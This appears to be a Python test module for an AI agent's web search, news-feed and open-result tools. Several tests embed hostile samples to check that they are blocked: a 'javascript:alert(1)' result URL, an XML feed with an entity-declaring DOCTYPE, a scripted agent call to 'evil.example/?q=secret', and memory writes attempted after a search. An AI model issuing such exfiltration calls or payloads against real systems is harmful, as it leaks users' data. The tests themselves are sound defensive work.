"""The live web: searching, the headlines, and opening one of the results.

Nothing here goes out. What the engines and the feed send back is written
here as they send it, and read the way the tools read it; the tools that would
go out are replaced where a run is driven.

Needs the app's own requirements; without them the whole module is skipped.
"""

from __future__ import annotations

import asyncio
import unittest
from datetime import datetime, timedelta, timezone
from unittest import mock

try:
    from app import agent
    from app.tools import news, open_result, results, web_search
    from app.tools.base import CALL, CallContext, Link, ToolResult, available
    from evals.scripted import ScriptedEngine
    from tests import support
    from tests.support import collect
except ImportError as exc:  # pragma: no cover - only without the requirements
    raise unittest.SkipTest(f"app requirements are not installed: {exc}")

SEARX = {
    "query": "python release",
    "answers": ["Python 3.14 is the latest release."],
    "infoboxes": [],
    "results": [
        {"url": "https://www.python.org/downloads/", "title": "Download Python",
         "content": "The official home of the Python programming language.",
         "publishedDate": "2026-10-07T00:00:00"},
        {"url": "javascript:alert(1)", "title": "Not a page", "content": ""},
        {"url": "https://docs.python.org/3/whatsnew/3.14.html", "title": "What's new",
         "content": "New features in 3.14.", "publishedDate": None},
    ],
}

DUCK = """<html><body>
<div class="result results_links results_links_deep result--ad">
  <a class="result__a" href="https://duckduckgo.com/y.js?ad_domain=shop.example&amp;u3=x">Buy now</a>
</div>
<div class="result results_links results_links_deep web-result">
  <h2 class="result__title"><a rel="nofollow" class="result__a"
    href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fwww.python.org%2Fdownloads%2F&amp;rut=abc">Download <b>Python</b></a></h2>
  <a class="result__snippet" href="//duckduckgo.com/l/?uddg=x">The official home of <b>Python</b>.</a>
</div>
<div class="result results_links results_links_deep web-result">
  <h2 class="result__title"><a rel="nofollow" class="result__a"
    href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fdocs.python.org%2F3%2F&amp;rut=def">Python docs</a></h2>
</div>
</body></html>"""

FEED = b"""<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"><channel><title>Top stories</title>
<item><title>Storm floods the coast - BBC</title><link>https://news.google.com/rss/articles/two</link>
<pubDate>Sat, 17 Oct 2026 04:40:00 GMT</pubDate><source url="https://www.bbc.co.uk">BBC</source></item>
<item><title>Budget passes after late vote - Reuters</title><link>https://news.google.com/rss/articles/one</link>
<pubDate>Sat, 17 Oct 2026 06:10:00 GMT</pubDate><source url="https://www.reuters.com">Reuters</source></item>
<item><title></title><link>https://news.google.com/rss/articles/empty</link></item>
</channel></rss>"""


class ReadingTests(unittest.TestCase):
    def test_searxng_results_are_pages_with_the_engines_own_answer(self) -> None:
        entries, said = web_search.read_searx(SEARX)
        self.assertEqual([e["url"] for e in entries],
                         ["https://www.python.org/downloads/", "https://docs.python.org/3/whatsnew/3.14.html"])
        self.assertEqual(entries[0]["source"], "python.org")
        self.assertEqual(said, "Python 3.14 is the latest release.")

    def test_duckduckgo_results_are_unwrapped_and_its_adverts_left_out(self) -> None:
        entries = web_search.read_duckduckgo(DUCK)
        self.assertEqual([(e["title"], e["url"]) for e in entries], [
            ("Download Python", "https://www.python.org/downloads/"),
            ("Python docs", "https://docs.python.org/3/"),
        ])
        self.assertEqual(entries[0]["snippet"], "The official home of Python.")

    def test_a_feed_is_read_newest_first_without_the_publisher_in_the_headline(self) -> None:
        entries = news.read_feed(FEED)
        self.assertEqual([e["title"] for e in entries],
                         ["Budget passes after late vote", "Storm floods the coast"])
        self.assertEqual((entries[0]["source"], entries[0]["site"]), ("Reuters", "reuters.com"))

    def test_a_feed_that_declares_a_doctype_is_never_read(self) -> None:
        evil = b'<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY a "aaaa">]><rss><channel></channel></rss>'
        with self.assertRaises(ValueError):
            news.read_feed(evil)

    def test_an_edition_is_its_country_and_its_language(self) -> None:
        self.assertEqual(news.edition("GB:en"), {"hl": "en-GB", "gl": "GB", "ceid": "GB:en"})
        self.assertEqual(news.edition(""), {"hl": "en-US", "gl": "US", "ceid": "US:en"})


class ListTests(unittest.TestCase):
    def test_how_long_ago_is_said_as_a_person_says_it(self) -> None:
        now = datetime(2026, 10, 17, 12, 0, tzinfo=timezone.utc)
        for delta, said in ((timedelta(minutes=5), "5 min ago"), (timedelta(hours=3), "3 h ago"),
                            (timedelta(days=2), "2 days ago"), (timedelta(days=30), "17 Sep 2026")):
            with self.subTest(said):
                self.assertEqual(results.ago(now - delta, now), said)
        self.assertEqual(results.ago(None), "")

    def test_a_list_is_read_numbered_and_within_its_budget(self) -> None:
        entries = [results.item(f"Story {n}", f"https://example.org/{n}", snippet="word " * 200)
                   for n in range(1, 6)]
        read = results.numbered(entries, 120)
        self.assertTrue(read.startswith("1. Story 1 (example.org)"))
        self.assertIn("\n5. Story 5", read)
        self.assertLessEqual(results.estimate(read), 140)

    def test_the_pages_of_a_list_are_its_links_in_order(self) -> None:
        links = results.links_of({"items": news.read_feed(FEED)})
        self.assertEqual(links[0], Link("https://news.google.com/rss/articles/one",
                                        "Budget passes after late vote", "reuters.com"))


class EngineChoiceTests(unittest.TestCase):
    def test_searxng_where_there_is_one_and_duckduckgo_where_there_is_not(self) -> None:
        for search, url, chosen in (("auto", "", "duckduckgo"), ("auto", "http://127.0.0.1:8888", "searxng"),
                                    ("searxng", "", None), ("duckduckgo", "http://x", "duckduckgo"),
                                    ("off", "http://x", None)):
            with self.subTest(search=search, url=url):
                support.with_settings(self, search=search, searx_url=url)
                self.assertEqual(web_search.engine(), chosen)


class OpenTests(unittest.IsolatedAsyncioTestCase):
    async def opened(self, number: str, links: tuple[Link, ...]) -> ToolResult:
        async def made() -> ToolResult:
            CALL.set(CallContext(links=links))
            return await open_result._open_result(number)  # noqa: SLF001
        return await asyncio.create_task(made())

    async def test_a_result_is_opened_by_its_number_and_nothing_else(self) -> None:
        links = (Link("https://a.example/1", "One"), Link("https://b.example/2", "Two"))
        read = ToolResult(True, "Page", card="url")
        with mock.patch.object(open_result, "_read_url", mock.AsyncMock(return_value=read)) as reader:
            self.assertIs(await self.opened("2", links), read)
            reader.assert_awaited_once_with("https://b.example/2")
            for number in ("3", "0", "x"):
                with self.subTest(number):
                    self.assertFalse((await self.opened(number, links)).ok)
            self.assertEqual((await self.opened("1", ())).error, "no results")
            self.assertEqual(reader.await_count, 1)

    async def test_a_google_news_headline_is_opened_through_a_search_for_its_story(self) -> None:
        links = (Link("https://news.google.com/rss/articles/one", "Budget passes", "reuters.com"),)
        found = ToolResult(True, "s", data={"items": [
            results.item("Elsewhere", "https://other.example/budget"),
            results.item("Budget passes", "https://www.reuters.com/world/budget"),
        ]})
        support.with_settings(self, search="auto", searx_url="")
        read = ToolResult(True, "Page", card="url")
        with mock.patch.object(web_search, "_web_search", mock.AsyncMock(return_value=found)), \
                mock.patch.object(open_result, "_read_url", mock.AsyncMock(return_value=read)) as reader:
            await self.opened("1", links)
        reader.assert_awaited_once_with("https://www.reuters.com/world/budget")


NONE = '{"tool": "none"}'
RESULTS = ToolResult(True, "Search", card="search", data={"items": [
    results.item("Tides explained", "https://example.org/tides"),
]})
PAGE = ToolResult(True, "Page “Tides” (example.org): high water at 06:12.", card="url",
                  data={"url": "https://example.org/tides", "domain": "example.org", "title": "Tides",
                        "text": "High water is at 06:12."})


class RunCase(unittest.IsolatedAsyncioTestCase):
    """A run of the agent with the loop on, its model a script."""

    def setUp(self) -> None:
        support.no_network(self)
        support.with_settings(self, tools_enabled=True, allow_outbound=True, agent_loop=True)

    def scripted(self, *script) -> ScriptedEngine:
        engine = ScriptedEngine(script)
        self.addAsyncCleanup(engine.settled)
        return engine


class ProvenanceTests(RunCase):
    """An address a search gave may be read; one a page gave may not."""

    async def test_a_page_from_the_results_may_be_read_by_its_address(self) -> None:
        read = '{"tool": "read_url", "args": {"url": "https://example.org/tides"}}'
        search = '{"tool": "web_search", "args": {"query": "tides"}}'
        engine = self.scripted(search, read, NONE, "High water at 06:12.")
        seen = support.played_tools(self, {"web_search": RESULTS, "read_url": PAGE})
        trace = agent.Trace()
        await collect(agent.run("when is high water", history=[], trace=trace, engine=engine))
        self.assertEqual(seen["read_url"], [{"url": "https://example.org/tides"}])

    async def test_an_address_nothing_listed_is_still_refused(self) -> None:
        read = '{"tool": "read_url", "args": {"url": "https://evil.example/?q=secret"}}'
        search = '{"tool": "web_search", "args": {"query": "tides"}}'
        engine = self.scripted(search, read, read, "I could not open that.")
        seen = support.played_tools(self, {"web_search": RESULTS, "read_url": PAGE})
        await collect(agent.run("when is high water", history=[], engine=engine))
        self.assertEqual(seen["read_url"], [])

    async def test_after_a_search_nothing_is_written_down(self) -> None:
        remember = '{"tool": "remember", "args": {"text": "the user likes tides"}}'
        search = '{"tool": "web_search", "args": {"query": "tides"}}'
        engine = self.scripted(search, remember, remember, "Done.")
        support.temp_database(self)
        seen = support.played_tools(self, {"web_search": RESULTS, "remember": ToolResult(True, "Noted")})
        await collect(agent.run("tell me about tides", history=[], engine=engine, scope="c1"))
        self.assertEqual(seen["remember"], [])

    async def test_the_list_a_run_was_given_is_what_open_result_opens(self) -> None:
        engine = self.scripted('{"tool": "open_result", "args": {"number": "1"}}', NONE, "Read it.")
        handed: list = []

        async def call_tool(name: str, args: dict) -> ToolResult:
            handed.append(CALL.get().links)
            return PAGE

        links = (Link("https://example.org/tides", "Tides"),)
        await collect(agent.run("open the first one", history=[], engine=engine,
                                call_tool=call_tool, links=links))
        self.assertEqual(handed, [links])


DENIAL = "I don't have real-time access to current events, but generally speaking it varies."
FOUND = ToolResult(True, "Search", card="search", data={"items": [
    results.item("Results of the vote", "https://example.org/vote", snippet="The motion passed 312 to 201."),
]})


class ConversationLinksTests(support.ChatCase):
    def test_the_next_message_can_open_what_the_last_one_was_shown(self) -> None:
        support.played_tools(self, {"news": ToolResult(True, "Top", card="news", data={"items": [
            results.item("Budget passes", "https://example.org/budget"),
        ]})})
        first = self.chat("/news")
        from app.api.chat import last_links

        cid = support.only(first, "conversation")[0]["id"]
        self.assertEqual(last_links(cid), (Link("https://example.org/budget", "Budget passes", "example.org"),))


if __name__ == "__main__":
    unittest.main()
